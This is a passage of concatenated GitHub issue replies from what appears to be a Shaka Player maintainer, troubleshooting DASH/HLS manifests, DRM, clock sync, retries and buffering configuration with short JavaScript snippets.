if it is being filtered by IP or location.. We also have a custom asset Tears of Steel (multiperiod with segmented subtitles and PTO) which uses Period-relative timestamps (IIRC).  This was added to specifically test the old behavior and should be updated  to match the new behavior.  (I was the one who created this asset, so I can help). The first frame in the media starts at 0.25 sec.  Chrome ignores this gap and reports a buffered range starting at 0.  Firefox reports this gap and it is larger than what we will jump at the beginning.  I suggest working with the encoder to make the content start at 0, or using presentationTimeOffset in the manifest.\nWe are working on gap jumping which will help this content, see #555.. The video stream for the first Period doesn't end at the end of the Period.  The Period ends at 11.008 sec, but the video stream ends at 10.96 sec.  This small gap breaks our buffering logic and puts us in a buffering state.\nWe are currently working on gap jumping and you can track it in #555, which should fix cases like this.. You can call player.drmInfo() after playback has started.  This will get the DrmInfo that was used to initialize EME.  In your case, the keySystem property will be com.widevine.alpha for Widevine, or com.microsoft.playready for PlayReady.. Looking at the manifest you gave, it says it is encrypted only with Widevine, not PlayReady.  It contains two <ContentProtection> elements, one for generic MP4 and one for Widevine.  If you added another with PlayReady that didn't have a <cenc:pssh> element, Shaka would support it fine.\nFrom our side, we have no way of knowing that this content will work with PlayReady, since the manifest doesn't tell us.  We would need to add a configuration option to add additional key systems.. IIRC, even though the old versions say they supported Fairplay, they didn't.  Safari doesn't support EME according to the spec and our polyfill for it is incomplete.  We would like to add it, but it is a complex feature to add.  We are working on it and you can track it in #382.\nSo really, this is better since I don't think we supported it before.  Though this is promising since Safari might start implementing the current spec.  :crossed_fingers:. This is a clock sync issue.  You can add a <UTCTiming> element to the manifest or set the .manifest.dash.clockSyncUri configuration to fix this, see #376 for more info.\nAt 2017-04-20T16:25:02Z (on my local clock) I fetched the manifest.  The availabilityStartTime is 2000-01-01T00:00:00Z, so the current time in media time should be 546020702000 ms.  The last segment in the manifest is listed as 5459893548158198, converted to ms is 545989354815 ms.  The difference is 31347 seconds.. I believe this will be fixed by #832.. We allow specifying retry parameters in a RetryParameters[1] object. You can specify this in the player configurations .manifest.retryParameters, .drm.retryParameters, and .streaming.retryParameters.  This allows you to set the retry delay and the number of times to retry.  This is separate from the given change.  So if your server gives a 404, we will retry using that configuration.  For example:\njs\nplayer.configure({\n  streaming: {\n    retryParameters: {\n      maxAttempts: 20\n    }\n  }\n});\nAlso, we still raise the error event when we handle network errors.  So if we get a 401 error, you can listen to the error event and signal to the user that they need to reauthenticate.\nWe don't allow restarting retries after we have stopped.  With the given change, we no longer retry forever for VOD, so a 403 error for VOD will stop playback.  We could add a configuration to allow for infinite retries for VOD or add a call to start retrying again.. @Ross-cz What kind of API are you interested in?  Would having an infiniteRetriesForVodStreams configuration be enough, or do you want something like a player.retryStreamLoading() call?. We have no plans to support indexRange.  This feature would require a large number of extra network requests just to get info about segment times.  Having this defies the point of a manifest, the manifest should contain the times of the segments so we don't have to download every segment first.  If you want to encode segment times in the container, you should be using SegmentBase.\nNote that we do support SegmentURL, but we don't support the indexRange attribute.  We only support SegmentURL when it is used with the duration attribute or SegmentTimeline.  This allows us to get the segment times from the manifest.\nI know that GPAC uses indexRange, but usually the duration is accurate.. The manifest says that there are the same number of segments in the audio and video streams.  We have no way of telling that those audio segments don't exist.  When we get a 404 from the server, we can't know why it doesn't exist.  For example, in live streams, if the clock isn't synchronized correctly, we may request a segment before it is created, meaning we can't always trust a 404.  For VOD, a 404 from the server should be an error and we should propagate it, not hide it.\nThis manifest is bad.  It should only describe the segments that exist.  One option would be to change the mediaPresentationDuration or the Period@duration to remove the last video segments.  Since the last video segment won't be played by the browser since there isn't any audio data available.. I cannot reproduce any error.  On a clean clone, running ./build/all.py runs successfully for me.  To help discover the issue, please answer the following questions:\nHave you tried with the latest master?\nWhat platform are you running on?\nWhat are the steps to reproduce?\nWhat exactly is the error?. I don't understand your feature request.  Are you asking to suppress the unsupported error?\nThe current behavior is correct to throw an error.  The browser doesn't support the given robustness value.  Since you passed it in, we assume your assets require it, so we assume that the browser won't be able to play the asset.  A robustness level is treated like any other configuration; similarly, if you set persistentStateRequired and the browser doesn't support it, then we throw an error.. The manifest specifies a single stream that is muxed with both video and audio.  This isn't supported by us and may not be supported by the browser.  Your manifest also says the stream contains vp9 codec while it also contains vorbis.  Chrome seems to choke on this while Firefox ignores it.\nIf you open chrome://media-internals, it show an error Audio stream codec vorbis doesn't match SourceBuffer codecs.  This is because we used the codec specified in the manifest, vp9.\nYou may be able to change the codec to be vp9, vorbis in the manifest, but this is not officially supported and may not work cross browser.  You should be separating the audio and video streams into separate streams.. We definitely don't support this.  Adding support would also be difficult since all of our code assumes there is at most one audio stream and at most one video stream.  Even though this may be a useful feature, I don't think we will be able to implement it, at least not soon.\nThere is a larger problem than our internals.  We use MSE to play content.  We create a SourceBuffer to give the media data to the browser to play.  MSE doesn't support multiple audio streams.  If you try to create another one, you'll get an error.  So using MSE alone, it is not possible for us to play the media.\nThere is a new standard called Web Audio API, which allows more control of audio content.  There is a feature to combine audio sources together.  So it may be possible to use this to play, but it would require a major refactoring to use.  Plus, we don't want to use this because it isn't supported on IE.\nIn general, it is preferable for the sources to be combined on the server.  The advantage of having audio and video streams separate is you can have multiple audio stream sources.  For example, to have a movie commentary, you can have one audio stream be the movie by itself and another stream that includes the commentary.  Then you can switch between them using our tracks API.  Also, by setting the Role, you will be able to switch audio streams by Role, see #767.. If the goal is to play different videos on the Chromecast vs locally, why not do the following:\njs\nvar player = castProxy.getPlayer();\nif (castProxy.isCasting())\n  player.load(remoteManifestUri);\nelse\n  player.load(localManifestUri);\nMy guess that line was added to CastProxy.prototype.setAppData, right?  The problem is the argument has a type of Object, so the compiler doesn't know what fields it has.  If you really want to do this, you can change the function comment line to be @param {{asset: {manifestUriCC: string}}} appData.. Error 7000 is LOAD_INTERRUPTED.  What is happening is that when you disconnect the Chromecast, we will attempt to resume the playback locally by calling localPlayer.load(manifestUri).  This happens before we raise the event.  Then in your listener, you call player.load(), which interrupts the previous load, causing the error.  But this error can be ignored, so long as your load() call is succeeding.. I don't see anything wrong with the manifests, but without a live (playable) manifest, it will be hard to determine where the problem is.  If you want, you can send it to me privately, my email is in CONTRIBUTORS and on my profile.\nAlso, you say cannot decode.  Are you talking about problems playing, or actual decoder errors?  If you are getting decoder errors (e.g. Shaka error VIDEO_ERROR, code 3016) there is nothing we can do.  Decoder errors are caused by the browser and usually are caused by bad content.  But if this is playback problems (e.g. infinite buffering), then it may be our problem.\nWhen it shows the black screen, what are the buffered ranges?  Is the currentTime inside a buffered range?  If you go to chrome://media-internals, does it show anything (select the button that matches video.src)?\nAlso, you mention that MPD@availabilityStartTime may be inaccurate.  We required it to be accurate to be able to play.  In v1.x we would try to correct invalid values.  However, this was complicated and hid content bugs.  In v2 we decided not to support these and only play based on the content.  This means that you need to correctly setup clock sync for live streams.. An update from emails: this was caused by time sync issues between the manifest times and the segment times.  This is likely a problem with the packager.\n@fgutierrezw Did you hear back from the packager?  Is there anything else we can do?. When playing it locally for me (on the latest master) it works fine for me.  The file contains non-ASCII characters, so you need to be careful about the encoding of the file.  When I downloaded it, the file was in UTF-8.  We only support UTF-8 and UTF-16 and we assume UTF-8 if there isn't a byte-order mark.\nSo try again from the latest master, e.g. https://nightly-dot-shaka-player-demo.appspot.com.  Also, check that the server is encoding the file correctly and check Chrome DevTools to make sure that we get the file correctly (note that DevTools only displays ASCII, so it won't look correct).  If it still doesn't work, please post a live MPD so I can try that.  You can send it privately if you want (my email is in CONTRIBUTORS and on my profile).. Closing due to inactivity.  If you are still having problems, feel free to reopen.. First, if you are going to make a network request for it, you might as well not do it and have the CDM do it.  The reason you would want to use setServerCertificate is to avoid the round trip to the server.  For example, if you embed it in the page, or if you make other requests at the same time.  Since you are making the request already, you can just have the browser do it for you.  Using setServerCertificate is optional.\nSecond, if the code you posted is exactly what you are using, it has an error in str2ab.  You create the array buffer, but don't fill it.  So you are giving us an array of 0s.  Also, you are using jQuery, which is converting the response to a string.  However, the certificate is actually binary.  This means that jQuery may be incorrectly converting the response to a string (for example, interpreting bytes as UTF-8 codepoints).  It would be better to use XMLHttpRequest to get the ArrayBuffer response directly.. What's happening here is the manifest specifies a cenc:default_KID field which tells us the key ID used for that stream.  When we get the license response, we look at the key statuses and we see that we don't have that key and we mark that track as restricted since we assume we can't play it.  In this case we have restricted every track so we throw an error.\nHowever, the manifest is wrong.  It tells us the key ID is 8e16ef57-d06d-47cb-a5e15fbabfe28a8f whereas the media is actually encrypted with key ID cd1260c6-6afe-4f2d-ae71cf27cb942158.  So you should either use the correct value or remove the field entirely.. Looking at chrome://media-internals shows an error Unsupported display unit type 4.  This is out of our control, the browser doesn't support it.  This is a problem with your packager or with your content.  See google/shaka-packager#192 for a similar case.. Have you tried with the latest master or the latest release?  Does the error occur with the demo app?  With the demo site, you can just load your manifest and run the following code in the JavaScript console:\njs\nshakaDemo.localPlayer_.addTextTrack('yourUrl', 'eng', 'caption', 'text/ttml');\nAre all the captions the same type?  If the external captions are TTML and the manifest ones are VTT or TTML in MP4, then we will error out in that version.  We don't support switching between text track formats until v2.1.\nAlso, the code you posted may not work because you don't use bind.  The nested function uses this, which will be window at that time.  To work, you need to do something like this (though the error won't cause the errors you see):\njs\nplayer.load(...).then(function() {\n  ...\n}.bind(this));\nAs for the out of order lines, this is partially a browser problem.  We just take the cues and create VTTCue objects and pass to the browser.  When the browser displays cues that have overlapping times, it displays them on top of each other in reverse add order.  That may be why they appear like that.  I don't know if we support the offset attributes nor how the browser will render them.. Sorry for this getting lost, but a lot has changed with the networking API since this was made.  Plus we are going to be adding progress events as part of #1051.  I'm going to close this for now.  Once #1051 is done we can discuss exposing the progress events themselves so the app can display something like you have here.  Again, sorry that we weren't looking at this.. The reason we have handleNetworkError_ is because of live content.  If there are clock-sync problems or if the server lags behind, we may request a segment before the server has it available.  But the segment may appear later, so we will retry after a slight delay.  This ensures that a delay in the server doesn't cause a full stop of live video.  With the default settings, we will stop retrying after 1 second, so if we request a segment only 1 second early, then a live stream will stall.\nIt should be noted that we will pause at least 4 seconds between these retries and we only make one request per stream (for a max of three for audio/video/text); so it seems unlikely to cause DDOS problems.\nSince this should only happen for live streams, we could change the logic to only use handleNetworkError_ for live streams.  We could also add a configuration to not retry for live streams; but I am hesitant to do that since the alternative is live stream stalling for slight delays.. I don't think an abstraction violation is a big problem here.  This is only for handling errors, not for normal streaming.\nOne concern is that most apps will use the default values.  Detecting whether they are provided or not can be hard especially since there are more than one; so changing one of the parameters may not be enough.  Also we don't know if the app is considering this case when they provide these values.\nBut there are a lot of reasons we may not be able to download segments now but can later.  Clock sync is one that the app doesn't know about and can't set retry-parameters for.  Also, if the manifest uses <SegmentTimeline>, we only have an explicit list of segments; meaning we will need to wait until the next manifest update to get the next segments.  The app may not be thinking of all these cases when they set the retry-parameters.\nI think the best case would be to only use handleNetworkError_ for live streams and to add another config to optionally not do this.  Something like .streaming.retryForLiveStreams (default to true).. We only officially support the latest version of Edge, which is 39 (or the more common EdgeHTML version 14).  (Supposedly) Edge will be updated more often similarly to Chrome, so we are only supporting the latest version.  Edge has a number of bugs in it (especially with EME) and the fixes for some newer bugs are mutually exclusive to older ones (e.g. #634).  We don't want to maintain support for older versions unless we have to.. Can you please provide an example manifest that reproduces your issue?  We calculate the position based on the segment numbers in the manifest, which should not change.  When there is a manifest update, the same segments should have the same segment number and media times.  If you are removing segments, then you should update attributes like startNumber so we calculate the correct segment number.\nIf this is a bug on our part, then it will mess with other parts, like calculation of SegmentTemplate when using $Number$, so this would not be the preferred fix.. @albertcsm Can you provide an example manifest?  Otherwise we are going to close the PR.. Your content is bad.  The reason you are not seeing more problems is because you use $Time$ in the URL template; if you used $Number$, more problems would appear.\nThe encoder is removing segments from the list without updating the startNumber attribute.  This means that the segment numbers of the segments in the update don't match their segment numbers in the original.  Your encoder should be setting the startNumber attribute so we can calculate the segment number correctly.\nFor example, in the audio stream, the first segment initially starts at 7888012920.  Since there is no startNumber, it has a segment number of 1.  Then the next segment starts at 7908066253 and has a segment number of 2.  Then in the next update, the first segment listed starts at 7908066253, so it has a segment number of 1.  A segment must have the same segment number for the whole presentation.. @albertcsm You are correct that it indicates the next segment to download; but @joeyparrish is also correct about needing to reset it once we use it.  Once we have downloaded a segment, we will download the next segment, not look back at the playhead time.\nThe problem (I think) is that we are resetting the value too soon in the method.  Your logs show that when we tried to fetch the segment from the next Period, it wasn't available yet.  So we wait a second and try again.  The problem is that now the resumeAt has been reset, so we try at the playhead.\nI think the solution should be to move the setting it to 0 to the end of the method where we actually append the segment.. I think we will handle the fix so I can include some tests.  Thanks for finding this.. It is not scheduled for v2.5, which is already late.  And v2.6 is a cleanup release and has already been planned.  So the minimum will be v2.7.\nAlthough, scanning the specs, it looks like this is just TTML with some extra metadata.  So we may already support this at a basic level.  We already don't support the full TTML style set.  But with some small changes, we may support just displaying the text.  You could try registering the TTML text parser under the SMPTE-TT codec and seeing if that works.. This looks like it could be implemented using clearkey.  But there is a problem.  AFAIK, all clearkey implementations use AES CTR for decryption, while HLS encryption uses AES CBC.  Even if the browser supported CBC, there is no way in EME to pass the encryption scheme or the IV.  If you are using Widevine encryption, this info is passed in the init data, but clearkey init data doesn't support these extra fields.\nSee #358 for a similar situation using DASH.. @avelad We probably wouldn't need that since we can just use the WebCrypto APIs to decrypt the content.  What we could do is just query that URL and get the key, then use that with WebCrypto to decrypt the data before passing to MediaSource.  I think AES-128 encrypts everything, so we might not even have to parse the container data.. There is a similar issue for multi-Period content.  If someone manually selects a track, when it switches to the next Period, AbrManager will select the tracks for the new Period. This can result in bandwidth changes.. We can play HLS content on all platforms so long as the underlying media can be played.  So if the HLS contains MP4 content, then it can be played on all platforms. If the HLS content contains MPEG2-TS, then it can only be played on browsers that support TS, namely Edge, Chromecast, and (eventually) Safari.\nSo you can play HLS on Firefox so long as the media is MP4.  We have a demo asset that uses MP4 HLS that can be played on all browsers.  But most HLS content uses TS, which isn't playable on all platforms.. @captnced Please start a new issue for that and be sure to include an example manifest.  Thanks.. @albertcsm Can you provide a playable version of the manifest?  You can send it privately to shaka-player-issues@google.com if you want.. @albertcsm Another user reported a similar issue, so I think the fix will apply to you as well.  If the issue persists, feel free to reopen.. @jstephenson01 This issue has been fixed so please don't post to this issue.  Please start a new issue for your issue.  Also include a test stream that reproduces your problem since I can play our PlayReady test assets without problem.. Sorry for the delay.  Your first Period starts at PT1497696260S, this means that it should appear that far from the start of the presentation.  For live streams, the presentation starts at the availabilityStartTime, so that means that your first Period starts 47 years in the future.  Your handling of presentationTimeOffset and segment times look correct, but you need to adjust the Period start times so they are in the presentation correctly.  (or you could adjust the availabilityStartTime to be that far in the past). If you look at the logs, you probably see the following logs, right?\nWidevine in HLS is only supported with SAMPLE-AES-CENC, not SAMPLE-AES\nThe problem is that we don't support cbc1 encryption with HLS content.  Even if we did, there aren't any browsers that support it (only Safari supports CBC and doesn't support Widevine).  You can specify the --protection_scheme cenc parameter to the packager to use cenc encryption, which is playable on all Widevine platforms.  I don't think the packager supports it with TS output; but it does support it with MP4 output.. Our demo app contains an HLS Widevine asset Angel One (HLS, MP4, multilingual, Widevine).  This was generated using the Shaka packager.\nWhat I meant is that you are generating HLS with MPEG2-TS media files.  The packager doesn't support cenc when using TS media, you must use cbc1.  If you change to output the media in MP4 format (which is supported on more browsers), then it will be playable.  To do this, you can just change the output file extensions from .ts to .mp4 (e.g. segment_template=audio$Number$.mp4).. @mhassanist Did you get the packager command to work?  Is there anything else we can do?. I believe this is caused by CrBug 718651, which is a duplicate of CrBug 728773.  It has been fixed in Chrome Canary (61) and I can't reproduce the error on that.  Also note the error only happens on the low bandwidth tracks, so you'll need to disable ABR.. Chrome 61 is in Stable, and I think this fix was cherry-picked to 60 anyway.  But now it works.. Can you give us a playable manifest?  Having a non-playable manifest like what you gave doesn't tell us much.  Though I do see that you don't have any clock synchronization in the manifest.  This can result in playback issues and time differences between the server and the client.  You should add a <UTCTiming> element to the manifest to synchronize the two.\nWhen you say the difference is changing, is this for a single playback session, or are you reloading the page on the next day and seeing a larger difference?  When you are checking, is the playhead at the live edge (the rightmost part of the seek bar)?\nYou mention getPlayheadTimeAsDate, are you using that to determine the difference between the client and the server?  Or are you looking at the burned in time on the client vs the current wall clock time?  If you play this stream on different browsers or machines, do you see the same behavior?. CORS is only enforced by the browser, and it is easy to bypass (Chrome has a --disable-web-security flag).  It also doesn't affect manually fetching it.  You could also provide a link to your app, which would not be restricted by CORS.  If you would rather not have the links be public, you can send them to shaka-player-issues@google.com.\nThe frame times in the video segments are relative to the start of the live stream.  So when the video is at 2 minutes, that means that we are playing 2 minutes into the live stream.  So the getPlayheadTimeAsDate literally takes the video.currentTime and adds the time the live stream started (which is the availabilityStartTime in the manifest).  So in this regard, we are using the times in the video to determine the current time.\nWhat metadata are you talking about for detecting the current time?\nI would also suggest running a single playback overnight and seeing if the gap changes.  If it doesn't change, it is probably a clock sync problem.  This may also happen if the availabilityStartTime changes, which is why it would help to have a live manifest to look at.. I have looked at it a little, I  checked early yesterday, then in the evening, then this morning.  When I play live at the live edge, I see a delay (compared to my local clock) of almost exactly 1 minute.  This has not changed so far.  I also notice the 20 second difference between the burned-in time vs getPlayheadTimeAsDate, but I don't know if it is changing.\nFrom what I can tell, the player is doing what it is supposed to.  The timecodes in the video segment matches the time we are returning in getPlayheadTimeAsDate.  My guess is that your encoder is burning in the wrong time.  Or the clock on your encoder's machine is different than your machine, which is causing the differences.. We do read the timestamps from the media segments (actually the browser does).  When we append a media segment, the browser looks at the times of the media frames to insert the frames into the timeline.  Then when playing the media, the video.currentTime is based on the frame times in the media files.  We only use the manifest times as an approximation so we can handle seeks.. I am sorry I wasn't clear, we are in fact saying the same thing.  We don't parse the media directly, the browser does.  All we have access to is fields like video.currentTime, which is based on the frame times in the media.  What I meant is that the media segment times in the manifest are only used for seeking, times like availabilityStartTime are used.  We need to use availabilityStartTime to determine how far into the live stream we are.  If you change this field, we may think we are farther into the stream than we are.\nThe problem is that there are two times in the media.  The one the browser uses is in the mp4 container.  This value is exposed in fields like video.currentTime.  SEI is short for \"supplemental enhancement information\" and is contained in the codec data.  Unfortunately, the browser doesn't expose any way for us to get that data out of the media.  Since we don't parse the media, we have no way of getting it.\nI would still think this is an encoder bug since your encoder is not handling gaps correctly.  The fact that the two media times don't match looks like a bug.. This is a bug on our part.  The time in the availabilityStartTime should default to UTC.  But we simply pass it to Date.parse(), which uses the local timezone.\nIt would be preferable for your assets to explicitly pass the timezone to avoid errors like this.  For example, use 2017-06-20T03:30:18Z.. In general, this is a good idea; thanks for the contribution.\nBut I don't think we should be guessing the capabilities of the device explicitly.  Since a number of factors can influence dropped frames, it would be better to treat this the same as the network.  Namely, if we have too many dropped frames, we downgrade.  If we don't have any dropped frames for a while, we can allow upgrades again.\nYou may want to use the shaka.abr.Ewma type to get a rolling average of the dropped frames per second.  Then use this to determine if we have too many dropped frames.\nYou could also use the video.playbackRate to determine if we are playing.  When we are paused or buffering, this will equal 0.. What I mean is that we should not have fixed pixel sizes at all.  It would be better to adapt based on the device rather than just dropping all UHD streams.  So rather than having explicit regions, I suggest adjusting to the next lower track.\nI would suggest a type to track an estimate for what the device supports, similar to how the bandwidth estimate works.  If we start dropping frames, then the estimate should go down below what is being played.  If we are not dropping frames, increase the estimate some (being sure to remember old data to avoid switching back and forth).  This will result in a dynamic estimate for what the device supports.\nThen SimpleAbrManager will poll the bandwidth and the video size estimate and choose the best track it can play (rather than having callbacks from DroppedFramesDetector).\nAlso, I don't think we should give it Playhead, or even the getStats method.  I don't want the abr manager to become too coupled with the rest of the library.  Remember this is a general interface that all implementations must use.  I would suggest having the SimpleAbrManager accept the <video> element and use that for dropped frames and playbackRate.. That change is already available if you use master; it will also appear in the v2.1.5 release, which will probably be released later next week.. This is a platform bug.  We call MediaSource.endOfStream to indicate that no more content is coming.  The browser should update the duration to match the already buffered content, but sometimes it doesn't.  In this case, IE/Edge is stopping, waiting for more content.\nYou may want to file a bug on Edge to fix it.  We will look into trying to work around it.. See also:  https://shaka-player-demo.appspot.com/docs/api/shaka.util.Error.html#value:6014\n@lelikg Can you provide explicit repro steps?  Can you provide a link to your demo app?  What version of Chrome are you using, is there an update available?  If I delay the license response by 20 seconds, I still get correct playback.. Using headless Chrome would be the easiest option since it wouldn't require any extra work and would operate the same as a normal production app.  It will also avoid stubbing out components that would affect behavior.\nIf you want to just run the DashParser, all you need to do is to setup a fake NetworkingEngine to make network requests.  It also requires a valid DOMParser, which there are some implementations in node.\nHowever, this will only give you the parsed manifest.  In your original question, you wanted to check for segment network errors and load testing.  The DashParser will only parse the manifest, not make segment requests.  To test the segments, you'll need to either make the network requests yourself using the manifest object, or use the whole Player, which would require stubbing out a lot of the media APIs.. Using headless Chrome would be the easiest option since it wouldn't require any extra work and would operate the same as a normal production app.  It will also avoid stubbing out components that would affect behavior.\nIf you want to just run the DashParser, all you need to do is to setup a fake NetworkingEngine to make network requests.  It also requires a valid DOMParser, which there are some implementations in node.\nHowever, this will only give you the parsed manifest.  In your original question, you wanted to check for segment network errors and load testing.  The DashParser will only parse the manifest, not make segment requests.  To test the segments, you'll need to either make the network requests yourself using the manifest object, or use the whole Player, which would require stubbing out a lot of the media APIs.. HTTP_ERROR is caused by the browser rejecting the network request.  We have no control over setting what requests the browser will accept.  \nThe hosted demo only uses https because it is required for EME.  If your content is clear, you can just run a local copy and just use http.  Also, https is not required when accessing localhost, so even if your content is encrypted, you can use http on localhost.\nIf you are only interested in tests, you have a few options:\n1) If you are running on localhost, you can start Chrome with --allow-insecure-localhost to ignore cert errors on localhost.\n2) Create a self-signed certificate and add it to your trusted certificates (for example, you can add it in Chrome settings).\n3) Start Chrome with --ignore-certificate-errors to ignore all certificate errors (UNSAFE).. Thanks for finding this.  It looks like the compiler is renaming the field.    The compiler may rename property access (e.g. foo.bar), but not indexer access (e.g. foo['bar']).  There should be a simple fix.. Closing due to inactivity.  If this is still a problem, feel free to reopen.. This issue is about documentation, there is nothing to fix here.  After #1087, we should support \"detaching\" the video from the Player so the video can be used by another instance.\n@samanmohamadi If you are trying to \"completely\" destroy the player, you should be able to do this with player.destroy, for example:\njs\noldPlayer.destroy().then(function() {\n  newPlayer = new shaka.Player(video);\n  // Use newPlayer...\n});\nIf you are having trouble with destroy, you should file a new bug.. So here's the problem:  when you call configure(), we switch to the different tracks and we clear the buffer.  This causes the video to pause while we buffer the new content.  This is important for changing languages, since you want the changes to be visible/audible immediately.\nThe restrictions object is meant to restrict what tracks can be played.  There are two kinds of restrictions,  one that is applied globally and one for ABR.  The global one is meant for giving Shaka Player more info about the platform or DRM.  For example, if the device can't play UHD, you can tell us not to try.  So if you change the restrictions, it is important to do so immediately since the content we are playing may not play well (or at all for protected content).\nWhen changing the restrictions for ABR, it may not make much sense to clear the buffer since the restrictions don't apply as strictly.  So I think we should make an exception and not clear the buffer when changing the ABR restrictions; but keep the old behavior when changing the global restrictions or changing languages/roles.. No, it is all part of the same issue.. @forbesjo Are you still interested in this PR?  If so, you'll need to rebase and make some style changes like using let instead of var.. The first error that occurs is a decoder error.  This only happens with adaptation; when switching to an affected track manually (when we clear the buffer first), the error doesn't occur.  Since this is a decoder error, this is likely a platform issue, but it may have to do with how we adapt.. I am fairly sure this is a limitation of the Safari decoder.  This may be caused by bad content, or just that Safari doesn't support this kind of content.  Safari plays other similar content fine, and it looks like we are doing all the correct things for this content.\nI have reduced the problem to only when adapting (or switching without clearing the buffer).  When we clear the buffer (and implicitly reset the decoder), the content plays fine.  It also plays fine on the stream by itself.  I think the streams are somehow incompatible with each other.  I also think this only applies to the 426x240 video stream.  One difference I notice between that and the other streams is that in the SPS the pic_order_cnt_type is different.  The Safari decoder may not support changing this field since it changes the way frame parsing happens.\nWe could remove that video stream from the manifest, but we don't control the original asset (it's a YouTube test asset).  We could either drop the asset completely or make a copy that doesn't have that representation.. I am hesitant to add this to the documentation since this is a common server-side configuration.  CORS requirements are imposed by the browser, not by Shaka, so most servers will have to deal with this whether they use Shaka or not.  Also, different server software will require different configurations to allow CORS.\nThere is already an entry in the FAQ when dealing with HTTP_ERROR.  We may also want to mention CORS setup in the tutorials.  But since this doesn't apply to Shaka specifically, it doesn't belong in the README.. I'll be sure to mention the Range header in the FAQ and in a new section in the tutorials.. Chrome doesn't support offline licenses on desktop platforms.  It is only supported on Chromebooks and is planned for Android.\nAlso note that persistentStateRequired doesn't mean offline licenses.  You can still set that parameter and play streaming licenses.  The only way to use offline licenses with Shaka is to use shaka.offline.Storage.. Do you have some example content that we could use?  It looks like your overrides are just removing the attributes in the TTML.  If the TTML says the origin should be in the top-left, then that's where they should appear.  Do you want us to ignore the style in the TTML or are we parsing the attributes incorrectly?. There is a better solution, but no browser implements it.  There exists a VTTRegion that is used just for this.  It allows specifying a sub-region to render the cues into.  However, as of now, there are no browsers that implement it.\nSo I think we will parse those attributes and expose them in our new shaka.text.Cue interface so a custom text renderer could handle it.  In the default renderer, we will try to add the VTTRegion; but for now, it will just ignore them.. That will be the default.  We will effectively ignore the setting and use the browser defaults (which is 'auto').. I am hesitant to add this.  This seems like a niche format that should be handled by the app.  This could easily be implemented by the app using a ResponseFilter.  Adding this to the library makes our library larger even for apps that will never want to use this.  It also will add more configuration values that may never be set.  Also, the fact that it is rejected by IE/Edge when it is allowed when played as SmoothStreaming seems to suggest either bad content or a platform bug.\nMaybe it would be better to provide an \"examples\" or \"contrib\" folder to show more advanced examples for how an app can play content.  You could also write it in a way to allow it to be imported into the build for people that need the feature:\nsh\n./build/build.py +@complete +contrib/ismv_fragment_filter.js. The Mp4Parser type should be exposed.  Any type or member marked with @export should be visible to the app.  You can also look at the documentation and on the right it lists all the public types.. First, can you try with the uncompiled library?  It would be helpful to see a stack trace of this, the stack trace in the screenshot doesn't look right (or in the library).  Also, how are you loading Shaka Player?  The top-level object doesn't look familiar, is it a wrapped error from some other library or the platform?  Is com.quickplay.plugins.shakaPlayer from your app (again doesn't look familiar)?. If that is the only bug here, I think we can work around it.  It would be nice to be able to support this browser.. Here are some things to check:\n Are we downloading segments?\n video.readyState, video.playbackRate,  video.paused, video.error\n player.isBuffering() (in the default demo it would be shakaDemo.localPlayer_.isBuffering())\n video events: playing, loadedmetadata, waiting (add listener before calling player.load())\n* Try calling video.play() and try setting video.currentTime to force a seek\nWhat is the value of video.buffered?  You'll need to manually get the ranges, for example:\njs\nvar b = [];\nfor (var i = 0; i < video.buffered.length; i++)\n  b.push([video.buffered.start(i), video.buffered.end(i)]);\nIf you are using the uncompiled library, you can also set the log level to get more info.  This could be used to see if something stalls or if we append segments successfully.\njs\nshaka.log.setLevel(shaka.log.Level.DEBUG);\nshaka.log.setLevel(shaka.log.Level.V1);\nshaka.log.setLevel(shaka.log.Level.V2);. > * Are we downloading segments?\n\nYes, I checked the manifest. It has the segmets.\n\nI was actually referring to checking the network tab to see if we are actually downloading them.\n\nDo you have any idea why buffered length is 0? Because, I checked the working version. That one's buffered length is 1. What may it cause this? Or what else can I check?\n\nA length of 0 means no content is buffered.  This can happen before we download segments, or if the content is not supported.\nMedia error 4 is MEDIA_ERR_SRC_NOT_SUPPORTED.  It looks like the browser doesn't like the MSE source.  I see there is a mediaKeys object that doesn't look correct.  Are you able to play clear content?  Can you try other manifests to see if this is a content problem?. From issue #771 it looks like Tizen 2.4 doesn't implement the APIs we need to use PlayReady.  The documentation you linked to shows that it uses a custom API to use PlayReady, which we don't support.  So it looks like that browser isn't supported for protected content, you can follow #771 to get updates.. Double check the content you are trying to play is protected.  Do you get any other errors?  For example, do you get a REQUESTED_KEY_SYSTEM_CONFIG_UNAVAILABLE error?  Did you wait enough time for the license request?  We may not send the license request immediately, the first request you get may be for the media segment.  Did you see the popup requesting access for premium content?  Did you allow it?  How about trying in an incognito tab?. First, there are two configs for this bufferingGoal and rebufferingGoal.  The bufferingGoal specifies how much to buffer while we are playing; rebufferingGoal specifies how much content to buffer before we start playing again.  In both cases, we will take the larger of the config and minBufferTime.  Check out the buffering tutorial for more info.\njs\nplayer.configure({streaming: {bufferingGoal: 45}})\nSecond, live streams are a bit different.  Because we are playing at the \"live edge\", there doesn't exist any more content ahead of the playhead, so there is nothing to buffer.  One option is to add a suggestedPresentationDelay to the manifest.  This specifies the delay from the live edge that the player should play at.  We will buffer past this, allowing more content to be buffered.. @mlondon1 The headers you listed are cache-control headers.  These are used by the browser to determine if it should return cached data rather than making the real request.  Shaka has no control over caching, it is up to the browser.. Duplicate of #982.. Closing due to inactivity.  @dattatray-wayachal  We can reopen if you provide the requested information.. @kuznetcoff777 That is correct.  We will buffer up to bufferingGoal + 1 segment.  So in your case, we will only buffer 30 seconds of content plus up to a partial segment.  If you're close to the live edge, there will only be suggestedPresentationDelay amount of content available, so we don't have any more content to buffer.\nAlso note that you may need to reload the asset if you change the suggestedPresentationDelay.. First your content has a lot of gaps in it (missing segments), which isn't a problem, but a bad user experience.  Second, your manifests include segments that aren't inside the availability window.  This means the first segment in the list is before timeShiftBufferDepth in the past.  Currently we will don't support this, but I will fix that.\nThe problem when ending is that the times for live segments aren't the same as for VOD segments.  When it is a live stream, the segment times are based on availabilityStartTime, which makes the segment times large (e.g. 88278328).  Once it becomes VOD, you use presentationTimeOffset to adjust the segment times to start at 0.  This changes the segment times, which would require us to seek and rebuffer.\nDo you know the duration of the live stream ahead of time?  Will the whole live stream be playable once it becomes VOD, or just part of it?  We support something called in-progress recordings.  These act like live streams while they are being recorded, but become VOD at the end.  To do this, set the mediaPresentationDuration at the beginning and have the availabilityStartTime be the start of the stream so the segment times start at 0 (which you should be doing anyway).  Then once the recording ends, you can just drop off the live attributes and it will become VOD.\nIf you don't know the duration ahead of time, it may still be possible.  If you start the availabilityStartTime when the stream starts so the segment times start at 0, then once it ends the segment times don't change.  But this only really works if the whole live stream will be available once it becomes VOD.  Trying to only use the last 